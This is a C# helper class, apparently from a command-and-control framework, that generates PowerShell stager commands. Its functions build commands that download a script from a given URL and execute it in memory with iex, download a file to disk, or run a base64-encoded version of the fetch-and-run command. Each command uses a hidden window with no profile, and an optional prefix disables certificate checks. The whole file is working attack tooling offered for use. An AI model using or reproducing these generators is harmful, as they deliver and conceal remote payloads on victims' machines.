using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Helper
{
    internal class ScriptHelper
    {

        public const string PowershellSSlScript = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;Add-Type 'using System.Net;using System.Net.Security;using System.Security.Cryptography.X509Certificates;public static class SSLHandler{public static void Ignore(){ServicePointManager.ServerCertificateValidationCallback=(sender,cert,chain,errors)=>true;}}';[SSLHandler]::Ignore();";

        public static string GeneratePowershellScript(string url, bool isSecured)
        {
            string script = string.Empty;

            if (isSecured)
                script += PowershellSSlScript;

            script += $"(New-Object Net.WebClient).DownloadString('{url}') | iex";

            return $"powershell -noP -sta -w 1 -c \"{script}\"";
        }

        
        public static string GeneratePowershellDownloadScript(string url, string fileName, bool isSecured)
        {
            string script = string.Empty;

            if (isSecured)
                script += PowershellSSlScript;

            script += $"wget {url} -OutFile {fileName}";

            return $"powershell -noP -sta -w 1 -c \"{script}\"";
        }

        public static string GeneratePowershellScriptB64(string url, bool isSecured)
        {
            string script = string.Empty;

            if (isSecured)
                script += PowershellSSlScript;

            script += $"(New-Object Net.WebClient).DownloadString('{url}') | iex";
            string enc64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
            return $"powershell -noP -sta -w 1 -e {enc64}";
        }

    }
}
